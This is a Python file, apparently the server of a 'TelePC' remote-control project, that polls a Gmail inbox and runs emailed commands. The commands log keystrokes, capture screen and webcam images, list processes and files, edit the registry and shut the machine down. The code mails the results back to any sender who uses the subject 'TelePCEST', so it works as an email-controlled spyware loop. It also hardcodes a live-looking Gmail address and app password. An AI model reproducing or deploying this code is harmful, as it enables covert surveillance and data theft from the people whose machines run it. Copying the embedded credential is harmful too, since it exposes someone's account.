# Work with Image
import service.key_logger as kl
import service.capture_screen as cs
import service.capture_webcam as cw
import service.mac_address as mac
import service.app_process as ap
import service.directory_tree as dt
import service.shutdown_logout as sl
import service.registry as rg
from PIL import Image
from io import BytesIO
import os
import imaplib
import smtplib
import time
import email
import email.utils
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from service.shared_function import *
import datetime
from dotenv import load_dotenv


# Global variables
global client

dotenv_path = Path('../.env')
load_dotenv()  # take environment variables from .env.

BUFSIZ = 1024 * 4
# EMAIL_ADDRESS = os.getenv("SERVER_EMAIL")
EMAIL_ADDRESS = "telepcest@gmail.com"
EMAIL_PASSWORD = 'xthfegvikcjsqzvb'

IMAP_URL = 'imap.gmail.com'
SMTP_URL = 'smtp.gmail.com'


command = []


def create_asset_folder():
    if not os.path.exists(ASSET_PATH):
        os.makedirs(ASSET_PATH)


def connect():
    # create an IMAP4 class with SSL
    imap = imaplib.IMAP4_SSL(IMAP_URL, 993)
    smtp = smtplib.SMTP_SSL(SMTP_URL)

    # authenticate imap and smtp
    try:
        imap.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        # rest of your code for reading emails
    except imaplib.IMAP4.error as e:
        print(f"Login failed. Reason: {e}")

    return imap, smtp


def send_mail(smtp, user, sender, msg: MIMEMultipart):
    # Send a reply message to the sender
    reply_msg = MIMEMultipart()
    # reply_msg['From'] = f'Mail server TelePC <{user}>'
    reply_msg['From'] = user
    reply_msg['To'] = sender
    reply_msg['Subject'] = "Server TelePC reply"

    reply_msg.attach(msg)

    smtp.sendmail(user, sender, reply_msg.as_string())
    print('Reply sent to', sender)

# receive and return mail


def receive_mail(imap, smtp):
    while True:
        # refresh mail box
        imap.select('Inbox')

        # search since last day
        date_since = (datetime.date.today() -
                      datetime.timedelta(days=1)).strftime("%d-%b-%Y")
        status, data = imap.search(None, '(UNSEEN SINCE "' + date_since + '")')

        if data[0] == b'':
            print('No new emails')
        else:
            # Otherwise, process the new messages
            for msg_id in data[0].split():
                typ, data = imap.fetch(msg_id, '(RFC822)')
                email_body = data[0][1]
                mail_message = email.message_from_bytes(email_body)

                # Get the sender, subject, and content of the message
                sender = mail_message['From']
                subject = mail_message['Subject']

                # check is multipart (ex: attachment, emoji, image)
                if mail_message.is_multipart():
                    content = mail_message.get_payload()[0].get_payload()
                else:
                    content = mail_message.get_payload()

                # Print the message details to the console
                print('New message received from:', sender)
                print('Subject:', subject)
                print('Content:', content)

                # Mark the message as read
                imap.store(msg_id, '+FLAGS', '\\SEEN')

                # do something here
                if subject == "TelePCEST":
                    # Format input
                    try:
                        format_content = content.replace("\r\n", " ")
                    except:
                        pass
                    res = function(format_content)

                    # reply back to sender
                    send_mail(smtp, EMAIL_ADDRESS , sender,  res)

        # Sleep for 10 second before checking for new emails again
        time.sleep(10)

# Separate each line into main part and sub part
def parse_msg(msg):
    options = []
    for line in filter(None, msg.strip().split('|')):
        options.append(line.strip().split(' - ', 1))

    return options


# dictionary action map
action_map = {
    "Key logger": kl.key_logger,
    "Capture screen": cs.capture_screen,
    "Capture webcam": cw.capture_webcam_image,
    "MAC address": mac.mac_address,
    "Directory tree": dt.directory_manage,
    "Shutdown/Logout": sl.shutdown_logout,
    "Application/Process": ap.application_process,
    "Registry": rg.registry
}


def function(msg):
    options = parse_msg(msg)
    res = MIMEMultipart()
    for func in options:
        result = None
        try:
            if (len(func) == 1):
                result = action_map[func[0]]()
            else:
                result = action_map[func[0]](func[1])
        except:
            result = "Wrong Format"

        if isinstance(result, str):
            # plaintext result
            if func[0] == "Directory tree":
                attachment = MIMEApplication(result.encode(
                    'utf-8'), Name="directory_tree.txt", _subtype="txt")
                attachment.add_header(
                    'Content-Disposition', 'attachment', filename="directory_tree.txt")
                res.attach(attachment)

            # elif func[0] == "Key logger":
            #     attachment = MIMEApplication(result.encode('utf-8'), Name="key_logger.log", _subtype="log")
            #     attachment.add_header('Content-Disposition', 'attachment', filename="key_logger.log")
            #     res.attach(attachment)

            elif func[0] == "Application/Process":
                attachment = MIMEApplication(result.encode(
                    'utf-8'), Name="app_process.txt", _subtype="txt")
                attachment.add_header(
                    'Content-Disposition', 'attachment', filename="app_process.txt")
                res.attach(attachment)

            else:
                    print(result)
                    res.attach(MIMEText(result.encode('utf-8'), 'html', 'utf-8'))

        elif isinstance(result, Image.Image):
            # convert to binary and to MIMEImage
            with BytesIO() as buffer:
                result.save(buffer, format='PNG')
                png_bytes = buffer.getvalue()
            result = MIMEImage(png_bytes, _subtype="png")

            if func[0] == "Capture screen":
                # annouce to mail
                text = "<p><b>CAPTURE SCREEN</b></p>" + "Picture has been capture"
                res.attach(MIMEText(text.encode('utf-8'), 'html', 'utf-8'))
                # attach picture
                result.add_header('Content-Disposition',
                                  'attachment', filename='screenshot.png')
                res.attach(result)

            elif func[0] == "Capture webcam":
                # annouce to mail
                text = "<p><b>CAPTURE WEBCAM</b></p>" + "Picture has been capture"
                res.attach(MIMEText(text.encode('utf-8'), 'html', 'utf-8'))
                # attach picture
                result.add_header('Content-Disposition',
                                  'attachment', filename='webcam_image.png')
                res.attach(result)

    return res


if __name__ == "__main__":
    create_asset_folder()

    imap, smtp = connect()
    receive_mail(imap, smtp)

    # logout and close mailbox
    imap.logout()
    smtp.quit()
